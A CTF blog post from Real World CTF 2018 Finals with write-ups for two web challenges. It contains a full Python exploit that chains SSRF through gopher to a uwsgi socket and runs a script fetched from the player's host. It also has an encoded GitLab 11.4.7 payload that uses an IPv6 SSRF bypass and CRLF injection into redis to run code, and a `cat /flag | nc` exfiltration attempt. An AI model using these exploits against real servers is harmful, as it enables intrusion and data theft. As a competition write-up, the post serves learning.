---
layout: post
title: Real World CTF 2018 Finals
category: ctf
tags: rwctf "Real World CTF"
---

For person who is looking for write-ups part:
***This post contains the write-ups for challenge Magic Tunnel and flaglab.***
***Click [here (Magic Tunnel)](#magictunnel) or [here (flaglab)](#flaglab) to jump.***

This is post for [CTF Advent Calendar 2018](https://adventar.org/calendars/3210). The post for day 16 was [【2018年】CTF Web問題のwriteupぜんぶ読む](https://graneed.hatenablog.com/entry/2018/12/16/003745) from @graneed111.

At the beginning of December, Chaitin Tech held special ctf named Real World CTF which is targetting at real-world.
Every challenges are somehow related to real-world things, also 0day (or 1day) was used to solve some challenges.


Here is list of challenges and brief introduction in finals:
* pwn
  * Station Escape (demo)
    * VMWare escape challenge
  * Engine for Neophytes (demo)
    * pwning challenge for browser based on Mac Safari
  * frawler
    * userland pwning on Google Fuchsia
  * The Pwnable Link (demo)
    * IP camera manufuctured by TP-LINK hacking challenge
  * router (demo)
    * router hacking challenge with modified snmp library
  * OBD Box (demo)
    * REAL car hacking challenge
  * KitKot (demo)
    * Windows application pwning challenge
* web
  * The Return of One Line PHP Challenge
    * One Line PHP Challenge (by 🍊) from HITCON CTF 2018 with `session.upload` disabled
  * Magic Tunnel
    * simple web application with django
  * The Last Guardian (demo)
    * Safari UXSS challenge
  * flaglab
    * GitLab hacking
  * RMI
    * Java RMI challenge
* forensics
  * rwext5
    * modified ext4 filesystem forensics
* blockchain
  * Acoraida Monica
    * I don't know much about that, it was ethereum stuff at least


You can see some challenges having `(demo)` which means players have to demonstrate the poc on the stage.
It was super cool concept for audience to see what is going on there. 
Also there was a real car on the stage to be hacked, the monitor on driving seat would be controlled like these posts:
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">#<a href="https://twitter.com/hashtag/RealWorldCTF2018?src=hash&amp;ref_src=twsrc%5Etfw">#RealWorldCTF2018</a> Congratulations! PPP successfully pwned the OBD Box  in the car to control the dashboard and got the first bloodof OBD Box at their second attempt today!🌟 <a href="https://t.co/KTzW8KjLUE">pic.twitter.com/KTzW8KjLUE</a></p>&mdash; Real World CTF (@RealWorldCTF) <a href="https://twitter.com/RealWorldCTF/status/1069056680812367872?ref_src=twsrc%5Etfw">2018年12月2日</a></blockquote>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/RealWorldCTF2018?src=hash&amp;ref_src=twsrc%5Etfw">#RealWorldCTF2018</a> Congratulations！LC↯BC successfully pwned the OBD box during their demonstration. <a href="https://t.co/7itWNHraAd">pic.twitter.com/7itWNHraAd</a></p>&mdash; Real World CTF (@RealWorldCTF) <a href="https://twitter.com/RealWorldCTF/status/1069133594369507333?ref_src=twsrc%5Etfw">2018年12月2日</a></blockquote>


<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


So the competition organizing was totally excellent which is one of the best CTF I've ever played.  
We TokyoWesterns ended up with 6th place with solving Magic Tunnel, router and flaglab, still enough to receive $10,000 USDT!! Why the organizers are so rich? :)
  
Now let's move on and see details of challenges I solved.


## Magic Tunnel {#magictunnel}
Description was just one URL where the challenge is hosted.
It seems something like simple uploader by url and found that was using curl to get contents without any validation for the given url.

I found the application is built with django by checking `/proc/self/cmdline` and extracted all related codes.
First I tried to get shell using `SECRET_KEY` from `settings.py` but there is no serialization stuff.
Next I found uwsgi setting using tcp socket as backend service for nginx proxy so I tried to abuse them.

In CGI protocol, there is some variables including script path to be executed. I thought uwsgi protocol should also have same mechanism.

Here is example packet from nginx proxy to uwsgi socket:
```
00000000: 009b 0100 0c00 5155 4552 595f 5354 5249  ......QUERY_STRI
00000010: 4e47 0000 0e00 5245 5155 4553 545f 4d45  NG....REQUEST_ME
00000020: 5448 4f44 0300 4745 540c 0043 4f4e 5445  THOD..GET..CONTE
00000030: 4e54 5f54 5950 4500 000e 0043 4f4e 5445  NT_TYPE....CONTE
00000040: 4e54 5f4c 454e 4754 4800 000b 0052 4551  NT_LENGTH....REQ
00000050: 5545 5354 5f55 5249 0100 2f09 0050 4154  UEST_URI../..PAT
00000060: 485f 494e 464f 0100 2f0d 0044 4f43 554d  H_INFO../..DOCUM
00000070: 454e 545f 524f 4f54 0f00 2f65 7463 2f6e  ENT_ROOT../etc/n
00000080: 6769 6e78 2f68 746d 6c0f 0053 4552 5645  ginx/html..SERVE
00000090: 525f 5052 4f54 4f43 4f4c 0800 4854 5450  R_PROTOCOL..HTTP
000000a0: 2f31 2e31 0e00 5245 5155 4553 545f 5343  /1.1..REQUEST_SC
000000b0: 4845 4d45 0400 6874 7470 0b00 5245 4d4f  HEME..http..REMO
000000c0: 5445 5f41 4444 520a 0031 3732 2e31 372e  TE_ADDR..172.17.
000000d0: 302e 310b 0052 454d 4f54 455f 504f 5254  0.1..REMOTE_PORT
000000e0: 0500 3530 3535 320b 0053 4552 5645 525f  ..50552..SERVER_
000000f0: 504f 5254 0200 3830 0b00 5345 5256 4552  PORT..80..SERVER
00000100: 5f4e 414d 4500 0009 0048 5454 505f 484f  _NAME....HTTP_HO
00000110: 5354 0e00 6c6f 6361 6c68 6f73 743a 3830  ST..localhost:80
00000120: 3830 0f00 4854 5450 5f55 5345 525f 4147  80..HTTP_USER_AG
00000130: 454e 5416 0070 7974 686f 6e2d 7265 7175  ENT..python-requ
00000140: 6573 7473 2f32 2e32 302e 3114 0048 5454  ests/2.20.1..HTT
00000150: 505f 4143 4345 5054 5f45 4e43 4f44 494e  P_ACCEPT_ENCODIN
00000160: 470d 0067 7a69 702c 2064 6566 6c61 7465  G..gzip, deflate
00000170: 0b00 4854 5450 5f41 4343 4550 5403 002a  ..HTTP_ACCEPT..*
00000180: 2f2a 0f00 4854 5450 5f43 4f4e 4e45 4354  /*..HTTP_CONNECT
00000190: 494f 4e0a 006b 6565 702d 616c 6976 65    ION..keep-alive
```

note that some variables are required to query uwsgi socket.
After some trying, I found important variables `UWSGI_FILE` and `SCRIPT_NAME` used to specify script path to be executed.
`UWSGI_FILE` is path to script and `SCRIPT_NAME` is just something related to function name to trigger (I don't know but not important).

So it's enough to execute arbirary script if I could query uwsgi socket with following variables:
```
{
    'QUERY_STRING': '',
    'REQUEST_METHOD': 'GET',
    'REQUEST_URI': '/',
    'PATH_INFO': '/',
    'SERVER_PROTOCOL': 'HTTP/1.1',
    'DOCUMENT_ROOT': '/',
    'SERVER_NAME': '',
    'HTTP_HOST': '100.100.0.5:8080',
    'UWSGI_FILE': 'path to script',
    'SCRIPT_NAME': '/a=foo'
}
```

Of course I need to send arbitrary tcp packet to query uwsgi since they are using special binary protocol.
You can find the details of uwsgi protocol at [uwsgi documentation](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html). 
It is really simple like `2 byte (length) + n byte (data)`.

Here is example code to craft uwsgi packet (using [this](https://gist.github.com/wofeiwo/9f38ef8f8562e28d741638d6de3891f6) as reference):

```python
def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items():
        pk += p16(len(k)) + k.encode('utf8') + p16(len(v)) + v.encode('utf8')
    result = b'\x00' + p16(len(pk)) + b'\x00' + pk
    return result

def gen_packet(var, body=''):
    return pack_uwsgi_vars(var) + body.encode('utf8')
```


Now I can execute arbitrary script on the server, but how to upload my payload on the server?

First I tried to connect back to my laptop from the web server but it didn't work.
So I tried to upload valid python script using some error message generated by web server, but it was really hard and seems that is impossible.

After 3 or 4 hours, I talked to my teammate and he told me the server could connect to his laptop. I was really shocked and got shell immediately. (217 got first blood during I was stuck!!!)

Here is final exploit:
```python
import requests
import sys
import struct


url = "http://100.100.0.5:8080"
# url = "http://100.100.14.206:8080"
# url = "http://localhost:8000"

p16 = lambda i:struct.pack('<H', i)
p8 = lambda i:struct.pack('<B', i)
u16 = lambda s:struct.unpack('<H', s)[0]

def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items():
        pk += p16(len(k)) + k.encode('utf8') + p16(len(v)) + v.encode('utf8')
    result = b'\x00' + p16(len(pk)) + b'\x00' + pk
    return result


def gen_packet(var, body=''):
    return pack_uwsgi_vars(var) + body.encode('utf8')

def query(path):
    sess = requests.session()
    # path = "file://{}".format(path)
    csrf = sess.get(url).content.split(b'name="csrfmiddlewaretoken" value="')[1].split(b'"')[0]
    req = sess.post(url, data={'url': path, 'csrfmiddlewaretoken': csrf})

    try:
        data_path = req.content.split(b'<img src="')[1].split(b'"')[0].decode()
    except:
        return None
    return sess.get(url+data_path).content, data_path

import urllib

_, path = query('http://100.100.14.206:8081/payload.py')

var = {
    'QUERY_STRING': '',
    'REQUEST_METHOD': 'GET',
    'REQUEST_URI': '/',
    'PATH_INFO': '/',
    'SERVER_PROTOCOL': 'HTTP/1.1',
    'DOCUMENT_ROOT': '/',
    'SERVER_NAME': '',
    'HTTP_HOST': '100.100.0.5:8080',
    'UWSGI_FILE': '/usr/src/rwctf'+path,
    'SCRIPT_NAME': '/a=hoasho4qwfe'
}

# print(query(sys.argv[1])[0], end='')
# exit()

payload = gen_packet(var, '')
# import socket
# s = socket.socket()
# s.connect(('localhost', 8000))
# s.send(payload)
# for _ in range(10):
#     print(s.recv(1024).decode())
# exit()

payload = 'gopher://127.0.0.1:8000/_'+urllib.parse.quote(payload)
print(payload)
print(query(payload))


# payload = """
# import os
# os.system('ls')
# """[1:-1]
#
# code = "a = [{}]\n\n".format(','.join(map(str, map(ord, payload))))
# code += "exec(chr(0)[1:].join(a))"
#
# a = requests.get(url+'/a/'+code).content.decode()
# f = a.find('a = [')
# t = a.find('))')+2
#
# data, data_path = query(url+'/a/'+urllib.parse.quote(code))
# print(data, data_path)
#
# sess = requests.session()
#
# http_req = """
# GET {path} HTTP/1.1
# Host: 100.100.0.5:8080
# Range: bytes={brange}
# Connection: close
#
# """[1:-1].replace('\n', '\r\n').format(path=data_path, brange='{}-{}'.format(f, t))

# print(http_req)
# payload = 'gopher://100.100.0.5:8080/_' + urllib.parse.quote(http_req)
# payload = 'gopher://localhost:8000/_' + urllib.parse.quote(http_req)
# data, data_path = query(payload)
# print(data, data_path)
# print(requests.get(url+data_path).content)

# print(query(sys.argv[1]).decode(), end='')
```

intentionaly I haven't deleted commented out line. You can see how I worked hard to solve without serving file on my laptop :P



## flaglab {#flaglab}
Let me show you a copy of description on the score server:
```
You might need a 0day.
http://100.100.0.100

download
```

The downloaded file contains just simple script to reset root password and docker-compose file. And here is docker-compose file:
```
web:
  image: 'gitlab/gitlab-ce:11.4.7-ce.0'
  restart: always
  hostname: 'gitlab.example.com'
  environment:
    GITLAB_OMNIBUS_CONFIG: |
      external_url 'http://gitlab.example.com'
      redis['bind']='127.0.0.1'
      redis['port']=6379
      gitlab_rails['initial_root_password']=File.read('/steg0_initial_root_password')
  ports:
    - '5080:80'
    - '50443:443'
    - '5022:22'
  volumes:
    - './srv/gitlab/config:/etc/gitlab'
    - './srv/gitlab/logs:/var/log/gitlab'
    - './srv/gitlab/data:/var/opt/gitlab'
    - './steg0_initial_root_password:/steg0_initial_root_password'
    - './flag:/flag:ro'
```

can you point out the vulnerability? Absolutely I couldn't on the day1, since there is no **designed** vulnerabilities - this is just GitLab in real-world.
Only one curious point is the image is not latest but one minor update before latest at the time, `11.4.8-ce.0`.

So there should be some 1day exploit by 11.4.7 which is fixed in 11.4.8. Also I've checked [GitLab CHANGELOG.md](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/CHANGELOG.md#1148-2018-11-27) but had no idea.

On the day2, I thought of SSRF to RCE in GitLab and googled with just three words `ssrf rce gitlab`, and found [Command Injection vulnerability on system_hook_push queue through web hook (#41293)](https://gitlab.com/gitlab-org/gitlab-ce/issues/41293).
In summary, they says that **you can execute arbitrary code with git user once you had a access to redis**.

Holy shit, another step is to find SSRF with CRLF injection.
It was easy to find the commit to fix the SSRF vulnerability in 11.4.7 and found [this commit](https://gitlab.com/gitlab-org/gitlab-ce/commit/ecbdef090277848d409ed7f97f69f53bbac7a92c).
So there is a way to bypass SSRF protection with IPv6 in 11.4.7. 
You can bypass SSRF protection with IPv6 like this: `[0:0:0:0:0:ffff:127.0.0.1]`

Also I've found a note about CRLF injection in [Security Release](https://about.gitlab.com/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/).
There was CRLF injection vulnerability in project mirroring with Git protocol which was enough to communicate with redis properly.

Then I wrote exploit which works locally, but didn't work on challenge server.
After some trying, I found that IPv6 is somehow disabled on the server.

I gave up to solve this challenge since my teammate are almost solving router challenge which is enough to be at 8th place.
After solving router challenge, my teammate got anxiety to be overtaken by other teams and claimed me to solve another challenge.
I explained solution and what I need to solve, then my teammate suggested me to ask organizers to enable IPv6.
And I asked organizer, 

> Hey, could you enable IPv6 if possible?

...just as a joke. Organizer said,

> OK.

I WAS IMPRESSED. only one hour remaining, still enough to get flag.

Now everything is ready to exploit. I tried to execue `cat /flag | nc [my local ip]` but it didn't work.
Then I tried to copy `/flag` to public file (I've selected my avatar) and it worked.
I totally forgot that `nc` command is not installed by default :P


Final payload for project mirroring is here:
```
git%3A//%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379/ho%0A%0Amulti%0A%0Asadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%0Alpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22File.binwrite%28%5C%27/var/opt/gitlab/gitlab-rails/uploads/-/system/user/avatar/37/avatar.png%5C%27%2C%20File.binread%28%5C%27/flag%5C%27%29%29%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%0Aexec%0A%0Aa
```

it is sending following data to redis
```
multi

sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"File.binwrite(\'/var/opt/gitlab/gitlab-rails/uploads/-/system/user/avatar/37/avatar.png\', File.binread(\'/flag\'))\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

exec

a
```

last character `a` is to ensure that there is `\n` after `exec`. Last line `exec` will not be executed without additional line.

Then I got flag data as my avatar at `/uploads/-/system/user/avatar/37/avatar.png`.


Thanks for reading. Tomorrow post for [CTF Advent Calendar 2018](https://adventar.org/calendars/3210) will be about explanation for authored challenges in CBCTF Quals by @mage_1868.